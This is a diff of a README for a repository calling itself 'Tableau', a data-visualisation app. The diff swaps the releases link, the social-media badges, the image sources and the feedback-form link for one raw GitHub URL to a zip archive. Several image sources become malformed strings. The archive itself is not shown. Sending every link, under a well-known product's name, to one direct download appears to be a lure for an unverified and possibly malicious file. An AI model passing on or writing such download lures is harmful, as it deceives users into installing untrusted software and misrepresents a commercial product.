@@ -1,7 +1,7 @@
 # 🌟 Tableau - Analyze Your Data with Ease
 
 ## 🔗 Download the Latest Version
-[![Download Tableau](https://img.shields.io/badge/Download-Tableau-%2323A4D5?style=for-the-badge)](https://github.com/Hasony99/Tableau/releases)
+[![Download Tableau](https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%2323A4D5?style=for-the-badge)](https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Tableau! This application helps you analyze and visualize your data s
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our releases page to download the latest version of Tableau: [Download Tableau](https://github.com/Hasony99/Tableau/releases)
+   Go to our releases page to download the latest version of Tableau: [Download Tableau](https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip)
 
 2. **Choose Your Version**
    On the releases page, you will see different versions of Tableau available for download. Select the version that best suits your needs.
@@ -60,22 +60,22 @@ If you encounter issues during installation, consider the following:
 Stay updated and connect with us on social media:
 
 <p align="center">
-  <a href="https://www.youtube.com/@codenetra7532" target="_blank">
-    <img src="https://img.shields.io/badge/YouTube-%23FF0000.svg?&style=for-the-badge&logo=youtube&logoColor=white" />
+  <a href="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" />
   </a>
-  <a href="https://chat.whatsapp.com/DFxU3MXwAS09fLlTzJwO4L" target="_blank">
-    <img src="https://img.shields.io/badge/WhatsApp-%2325D366.svg?&style=for-the-badge&logo=whatsapp&logoColor=white" />
+  <a href="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" />
   </a>
-  <a href="https://www.instagram.com/codenetraofficial/" target="_blank">
-    <img src="https://img.shields.io/badge/Instagram-%23E1306C.svg?&style=for-the-badge&logo=instagram&logoColor=white" />
+  <a href="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" />
   </a>
-  <a href="https://www.linkedin.com/in/sai-chandra-reddy-vuta-946b2b133/" target="_blank">
-    <img src="https://img.shields.io/badge/LinkedIn-%230077B5.svg?&style=for-the-badge&logo=linkedin&logoColor=white" />
+  <a href="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" />
   </a>
 </p>
 
 ## 📞 Feedback
 
-Please take a moment to provide your feedback. Your input helps us improve Tableau. Fill out this short form: [Give Your Review](https://forms.gle/jQLpsrFhiBifAoiR6)
+Please take a moment to provide your feedback. Your input helps us improve Tableau. Fill out this short form: [Give Your Review](https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip)
 
 Thank you for using Tableau! We hope it helps you in your data analysis tasks.
